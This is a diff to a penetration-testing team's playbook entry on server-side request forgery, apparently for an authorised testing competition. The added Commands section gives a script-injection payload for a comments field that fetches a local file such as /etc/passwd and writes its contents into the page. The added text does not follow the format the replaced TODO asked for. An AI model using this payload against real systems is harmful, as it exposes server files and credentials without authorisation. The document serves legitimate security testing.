@@ -3,8 +3,8 @@
 # 12. Server-Side Request Forgery (SSRF)
 
 - **Phase:** No credentials or Low credentials (wherever the feature is)
-- **Risk:** 🟡 Noisy *(proposed)*: the client's server makes requests we choose. Reading cloud metadata can expose live keys: stop at proof, pass keys to the team and don't use them without approval.
-- **Tier:** Recognize *(proposed)*
+- **Risk:** 🟡 Noisy: the client's server makes requests we choose. Reading cloud metadata can expose live keys: stop at proof, pass keys to the team and don't use them without approval.
+- **Tier:** Recognize
 - **Finding:** none in the library yet
 - **Ports:** 80, 443
 - **Tools:** Burp Suite
@@ -18,14 +18,22 @@ In 2024 a report generator that turned user input into a PDF ran our script on t
 **Fix to recommend:** allow-list the hosts and URL schemes the server may fetch; check what comes back before returning it.
 
 ## Commands
-[[TODO: Copy the steps from the 2024 doc "Web - Server-Side Request Forgery (SSRF).docx". Leave out the 2024 hosts, IPs, URLs, company names and screenshots; use placeholders such as `$TARGET` and `$URL`. Format per `templates/finding.md`: numbered steps, exact command or browser step in backticks, an "Expected:" line under each.]]
+A vulnerability was found in a comments field on a web page by inserting some javascript into the form using
+
+```
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("$TYPE$","$PAYLOAD$");x.send();
+</script>
+```
+
+Where TYPE might be GET, POST, PUT, etc, and PAYLOAD would be something like a file `file:///etc/passwd`
+
 
 ## Evidence to capture
 - `evidence/F-NNN-01.png`: the input field with the test input.
 - `evidence/F-NNN-02.png`: the result showing data from inside the server, secrets redacted.
 
 ## Practice
-- PortSwigger Web Security Academy, SSRF labs *(proposed)*
+- PortSwigger Web Security Academy, SSRF labs
 
 ---
 *Adapted from the CCSF 2024 Web playbooks. Updated by the CCSF 2026 team.*
